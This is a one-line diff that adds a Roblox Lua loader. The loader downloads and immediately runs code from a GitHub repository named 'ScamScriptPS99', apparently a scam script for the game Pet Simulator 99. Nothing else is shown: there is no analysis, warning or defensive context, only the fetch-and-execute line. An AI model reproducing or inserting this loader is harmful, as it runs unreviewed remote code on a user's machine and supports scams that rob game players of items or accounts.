@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/azeronaldo83/ScamScriptPS99/refs/heads/main/ScamScriptWorking"))()
